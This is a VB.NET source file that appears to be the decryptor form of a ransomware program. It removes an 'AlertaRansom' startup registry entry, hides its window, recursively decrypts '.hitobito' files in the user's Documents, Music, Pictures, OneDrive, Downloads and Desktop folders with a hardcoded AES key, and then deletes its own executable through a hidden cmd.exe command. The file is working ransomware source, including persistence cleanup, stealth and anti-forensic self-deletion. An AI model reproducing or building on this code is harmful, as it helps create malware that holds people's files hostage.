Imports System.IO
Imports System.Security.Cryptography

Public Class Form2

    Protected Overrides ReadOnly Property ShowWithoutActivation As Boolean
        Get
            Return True
        End Get
    End Property

    Private Shared key As Byte() = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32}
    Private Shared iv As Byte() = {33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48}
    Private Shared newExtension As String = ".hitobito"

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Try
            Dim regKey As Microsoft.Win32.RegistryKey
            regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            regKey.DeleteValue("AlertaRansom")
        Catch ex As Exception

        End Try


        Me.Visible = False
        Me.Opacity = 0
        Me.ShowInTaskbar = False
        Me.ShowIcon = False

        Try
            RecursivelyDecrypt(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
        Catch ex As Exception
        End Try

        Try
            RecursivelyDecrypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
        Catch ex As Exception
        End Try

        Try
            RecursivelyDecrypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
        Catch ex As Exception
        End Try

        Try
            RecursivelyDecrypt(Environment.GetEnvironmentVariable("UserProfile") & "\OneDrive")
        Catch ex As Exception
        End Try

        Try
            RecursivelyDecrypt(Environment.GetEnvironmentVariable("UserProfile") & "\Downloads")
        Catch ex As Exception
        End Try

        Try
            RecursivelyDecrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
        Catch ex As Exception
        End Try

        Dim KillYourself As ProcessStartInfo = New ProcessStartInfo()

        KillYourself.Arguments = "/C choice /C Y /N /D Y /T 5 & Del " & """" & Application.ExecutablePath & """"
        KillYourself.WindowStyle = ProcessWindowStyle.Hidden
        KillYourself.CreateNoWindow = True
        KillYourself.FileName = "cmd.exe"

        Process.Start(KillYourself)

        Warning.Close()
        Form1.Close()
        Me.Close()
        Application.Exit()


    End Sub

    Private Sub RecursivelyDecrypt(folderPath As String)
        Dim files As String() = Directory.GetFiles(folderPath)
        For Each file As String In files
            If IsEncryptedFile(file) Then
                DecryptFile(file)
            End If
        Next
        Dim subFolders As String() = Directory.GetDirectories(folderPath)
        For Each subFolder As String In subFolders
            RecursivelyDecrypt(subFolder)
        Next
    End Sub

    Private Function IsEncryptedFile(filePath As String) As Boolean
        Return filePath.EndsWith(newExtension)
    End Function

    Private Sub DecryptFile(filePath As String)
        Try
            Dim originalFilePath As String = filePath.Substring(0, filePath.Length - newExtension.Length)
            Using aesAlg As Aes = Aes.Create()
                aesAlg.Key = key
                aesAlg.IV = iv
                Using fsIn As New FileStream(filePath, FileMode.Open), fsOut As New FileStream(originalFilePath, FileMode.Create)
                    Using decryptor As ICryptoTransform = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV)
                        Using csDecrypt As New CryptoStream(fsIn, decryptor, CryptoStreamMode.Read)
                            csDecrypt.CopyTo(fsOut)
                        End Using
                    End Using
                End Using
            End Using
            File.Delete(filePath)
        Catch ex As Exception

        End Try
    End Sub
End Class
